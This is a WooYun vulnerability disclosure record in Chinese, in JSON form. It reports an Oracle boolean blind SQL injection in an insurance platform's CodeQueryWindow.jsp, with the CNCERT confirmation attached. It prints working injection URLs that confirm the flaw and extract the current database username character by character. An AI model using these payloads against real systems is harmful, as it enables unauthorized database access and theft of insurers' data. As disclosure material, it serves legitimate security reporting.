{"id": 87376, "wybug_id": "wooyun-2016-0196465", "wybug_title": "农银人寿&amp;大童保险同一系统存在Oracle盲注（附验证过程/或涉及更多案例）                                      ", "wybug_corp": "CNCERT", "wybug_author": "路人甲", "wybug_date": "2016-04-15 11:40", "wybug_open_date": "2016-06-03 10:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-03：\t细节向公众公开  简要描述： 没错都是一个系统的...或许还涉及更多案例？夜空中最亮的星能否听清那仰望的人心底的孤独和叹息夜空中最亮的星能否记起曾与我同行消失在风里的身影我祈祷拥有一颗透明的心灵和会流泪的眼睛给我再去相信的勇气越过谎言去拥抱你  详细说明：  http://**.**.**.**/bugs/wooyun-2010-0119996http://**.**.**.**/bugs/wooyun-2015-0119873http://**.**.**.**/bugs/wooyun-2015-0119996此注入点与之前已知的上面这几个注入点不同。http://**.**.**.**/bugs/wooyun-2016-0196048发了这个洞之后，根据这个漏洞的思路我决定继续去看看它的Js文件。之前已经发现的漏洞：http://**.**.**.**/bugs/wooyun-2015-0120530/他是定位到了/common/easyQueryVer3/EasyQueryVer3.js这个文件而我这次是定位到了/common/javascript/Common.js这个文件，感觉一般会关注这个名字的JS文件更多。\nif(strCode==\"AgentCode\"||strCode==\"OccupationCode\")\t\t\t\t\t\t{\t\t\t\t\t\t\t//由于代理人数据和职业类别数据的数据量较大，无条件遍历查询时会严重影响汉化显示速度\t\t\t\t\t\t\t//特对他们的汉化查询进行了单独处理（有条件单条查询，结果不会再缓存）\t\t\t\t\t\t\turlStr = \"../common/jsp/CodeQueryWindow.jsp?codeType=\" + strCode+\"&codeField=\"+strCode+\"&codeConditon=\"+strCodeValue;\t\t\t\t\t\t}\t\t\t\t\t\telse\t\t\t\t\t\t{\t\t\t\t\t\t\turlStr = \"../common/jsp/CodeQueryWindow.jsp?codeType=\" + strCode;\t\t\t\t\t\t}\t\t\t\t\t\t//sFeatures = \"status:no;help:0;close:0;dialogWidth:10px;dialogHeight:0px;dialogLeft:-1;dialogTop:-1;resizable=1\";\t\t\t\t\t\t//连接数据库进行CODE查询，返回查询结果给strQueryResult\t\t\t\t\t\t\t\t\t\t\t\t//strQueryResult = window.showModalDialog(urlStr, \"\", sFeatures);\t\t\t\t\t\tRequest = new ActiveXObject(\"Microsoft.XMLHTTP\");\t\t\t\t\t\tRequest.open(\"GET\", urlStr, false);\t\t\t\t\t\tRequest.send(null);\t\t\t\t\t\ttry\t\t\t\t\t\t{\t\t\t\t\t\t\tstrQueryResult = Request.responseText.trim();\t\t\t\t\t\t}\t\t\t\t\t\tcatch(e1)\t\t\t\t\t\t{\t\t\t\t\t\t\talert(\"数据返回出错：\"+e1.message);\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t}\n在这段代码中也发现了可以被我们用来构造URL对数据库进行查询操作的点。既然会进行查询的操作，就有可能会存在注入，并且这种查询的为boolean盲注可能性大...于是我构造了URL来测试：\nhttp://**.**.**.**:7060/ui/common/jsp/CodeQueryWindow.jsp?codeType=test' OR 3*2*1=6 AND 000477=000477--\n\n\n\nhttp://**.**.**.**:7060/ui/common/jsp/CodeQueryWindow.jsp?codeType=test%27%20OR%203*2*1=6%20AND%20000477=000476--\n\n\n显然当我们构造逻辑正确时查询正确执行了。接下来对其进行验证：首先还是来确定当前数据库用户名长度\nhttp://**.**.**.**:7060/ui/common/jsp/CodeQueryWindow.jsp?codeType=test%27%20OR%203*2*1=6%20AND%20000477=000477%20AND%20length%28SYS_CONTEXT%28%27USERENV%27,%27CURRENT_USER%27%29%29=6--\n确定当长度为6时正确回显\n\n接下来跑一下用户名（本来用Py写了个脚本，但是一直有奇怪的问题，就暂时用Burp来验证下）：\nhttp://**.**.**.**:7060/ui/common/jsp/CodeQueryWindow.jsp?codeType=test' OR 3*2*1=6 AND 000477=000477 AND length(SYS_CONTEXT('USERENV','CURRENT_USER'))=6 AND ascii(substr(SYS_CONTEXT('USERENV','CURRENT_USER'),1,1))=1--\n\n\n得到对应ascii码：65 71 69 78 67 89对应得到当前用户为：AGENCY上面以农银人寿为例说明了其系统存在的Oracle的布尔型盲注，该系统还应用到了一些其他的保险平台上，以大同保险的影像平台为例：\nhttp://**.**.**.**/easyscan/common/jsp/CodeQueryWindow.jsp?codeType=test\n\n\n这里虽然页面上看上去没有，但是其实在页面的source中还是有返回的。测试的方式完全和上面一样。可能还涉及更多的案例（但一些版本已做了一定修复，导致访问查询文件会跳转），尚未找到更多的案例。http://**.**.**.**/khyal/\n\n   漏洞证明：  如上   修复方案：  ( ╯□╰ )   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-04-19 10:18 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向保险行业信息化主管部门通报,由其后续协调网站管理单位处置.  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}